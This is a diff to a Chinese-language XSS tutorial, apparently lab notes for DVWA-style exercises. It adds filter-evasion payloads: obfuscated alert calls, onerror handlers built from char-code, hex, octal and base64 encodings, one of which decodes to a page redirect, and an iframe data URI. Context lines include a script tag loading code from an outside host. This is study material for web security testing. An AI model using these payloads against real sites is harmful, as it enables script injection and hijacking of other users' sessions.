@@ -74,6 +74,11 @@ medium：
  成功弹框
 
 
+利用top
+```html
+<script>top["al"+"ert"](`xss`);</script>
+```
+
 
 
 high的代码很有效的过滤了所有  script的标签，但是，他旺旺没想到，魔高一尺道高一丈，你大爷永远是你大爷：
@@ -110,8 +115,24 @@ XSS注入常用语句（整理）
 < > ' " = : ; 
 ```
 查看这些东西有什么是被过滤了的符号或者替换了
+```
 
+**Ascii码绕过**
+<img src="a" onerror="eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))">
 
+**hex绕过**
+
+<img src=a onerror=eval('\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29')>
+
+**八进制**
+
+<img src=a onerror=alert('\170\163\163')>
+
+**base64绕过**
+<img src="a" onerror="eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw=='))">
+
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">
+```
 
 ```
 
@@ -461,4 +482,9 @@ a="get";b="URL";c="javascript:";d="alert('XSS');";eval(a+b+c+d);
 <DIV STYLE="width: expression(alert('XSS'));">
  
 <SCRIPT a=">" SRC="httx://xss.rocks/xss.js"></SCRIPT>
+
+**绕waf**
+
+
+
 
